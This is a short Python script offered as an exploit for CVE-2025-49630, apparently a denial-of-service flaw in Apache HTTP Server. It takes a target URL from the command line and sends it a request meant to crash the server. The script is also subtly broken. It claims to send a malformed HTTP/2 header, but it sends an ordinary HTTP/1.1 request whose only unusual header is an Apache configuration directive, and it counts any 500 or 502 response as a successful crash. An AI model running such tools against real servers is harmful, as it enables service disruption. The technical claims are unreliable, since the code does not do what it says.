 import requests
import sys

def exploit_cve_2025_49630(target_url):
    try:
        # Send an HTTP/2 request with a malformed header to trigger the assertion failure
        headers = {
            "ProxyPreserveHost": "on",
            "Accept": "*/*"
        }
        response = requests.get(target_url, headers=headers, timeout=5)
        if response.status_code == 500 or response.status_code == 502:
            print(f"[+] Exploit successful! Apache HTTP Server crashed: {target_url}")
        else:
            print(f"[-] Exploit failed: {target_url}")
    except requests.exceptions.RequestException as e:
        print(f"[-] Error: {e}")

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python exploit_cve_2025_49630.py <target_url>")
        sys.exit(1)

    target_url = sys.argv[1]
    exploit_cve_2025_49630(target_url)
